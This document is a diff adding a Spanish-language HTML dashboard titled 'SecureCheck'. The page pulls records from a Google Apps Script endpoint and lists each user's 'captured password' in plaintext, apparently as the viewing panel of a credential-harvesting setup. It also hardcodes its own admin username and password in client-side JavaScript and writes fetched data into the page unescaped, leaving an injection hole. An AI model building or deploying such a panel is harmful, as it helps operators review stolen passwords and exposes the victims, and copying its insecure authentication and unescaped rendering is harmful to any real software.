@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard SecureCheck - Control Central</title>
+    <style>
+        #contenido-panel { display: none; }
+        body { margin: 0; padding: 20px; font-family: 'Segoe UI', sans-serif; background: #0b141d; color: #e2e8f0; }
+        .container { max-width: 1100px; margin: auto; }
+        .header-panel { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 20px; margin-bottom: 30px; }
+        h1 { color: #38bdf8; margin: 0; font-size: 24px; }
+        .table-wrapper { background: #15202b; border-radius: 12px; overflow: hidden; border: 1px solid #1e293b; }
+        table { width: 100%; border-collapse: collapse; min-width: 800px; }
+        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 13px; text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
+        .pass-cell { color: #4ade80; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(74, 222, 128, 0.1); padding: 4px 8px; border-radius: 4px; }
+        .loading { padding: 40px; text-align: center; color: #94a3b8; font-style: italic; }
+        .btn-refresh { background: #38bdf8; color: #0b141d; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        .btn-refresh:hover { background: #7dd3fc; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="contenido-panel">
+    <div class="header-panel">
+        <h1>Dashboard Global SecureCheck</h1>
+        <button class="btn-refresh" onclick="cargarRegistros()">Actualizar Datos</button>
+    </div>
+    
+    <div class="table-wrapper">
+        <table>
+            <thead>
+                <tr>
+                    <th>Usuario Detectado</th>
+                    <th>Contraseña Capturada</th> 
+                    <th>Riesgo</th>
+                    <th>Fecha de Captura</th>
+                </tr>
+            </thead>
+            <tbody id="tabla">
+                <tr><td colspan="4" class="loading">Iniciando conexión con el servidor...</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    // Credenciales de acceso al panel
+    const adminUser = "secure";
+    const adminPass = "Linares2025.";
+
+    // --- DEBES PEGAR AQUÍ LA URL DE TU SCRIPT DE GOOGLE ---
+    const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
+
+    // Función de autenticación al cargar la página
+    function autenticar() {
+        const u = prompt("Usuario de Administrador:");
+        const p = prompt("Contraseña de Administrador:");
+
+        if (u === adminUser && p === adminPass) {
+            document.getElementById("contenido-panel").style.display = "block";
+            cargarRegistros();
+        } else {
+            alert("Acceso denegado.");
+            window.location.href = "index.html"; 
+        }
+    }
+
+    // Función para descargar los datos de Google Sheets
+    async function cargarRegistros() {
+        let tabla = document.getElementById("tabla");
+        tabla.innerHTML = "<tr><td colspan='4' class='loading'>Descargando datos desde la nube...</td></tr>";
+
+        try {
+            const respuesta = await fetch(webAppUrl);
+            const filas = await respuesta.json(); // Obtiene el JSON de la nube
+            tabla.innerHTML = "";
+
+            if (filas.length === 0) {
+                tabla.innerHTML = "<tr><td colspan='4' class='loading'>No hay registros en la base de datos.</td></tr>";
+                return;
+            }
+
+            // Invertimos el orden para mostrar lo más nuevo primero
+            filas.reverse().forEach(r => {
+                const colorRiesgo = r[2] === "ALTO" ? "#f87171" : "#fbbf24";
+                tabla.innerHTML += `
+                    <tr>
+                        <td>${r[0]}</td>
+                        <td><span class="pass-cell">${r[1]}</span></td>
+                        <td style="color: ${colorRiesgo}; font-weight: bold;">${r[2]}</td>
+                        <td>${r[3]}</td>
+                    </tr>`;
+            });
+        } catch (error) {
+            console.error(error);
+            tabla.innerHTML = "<tr><td colspan='4' class='loading' style='color:#f87171;'>Error de conexión: Revisa si la URL de Google es correcta.</td></tr>";
+        }
+    }
+
+    // Ejecutar autenticación al abrir
+    window.onload = autenticar;
+</script>
+</body>
+</html>
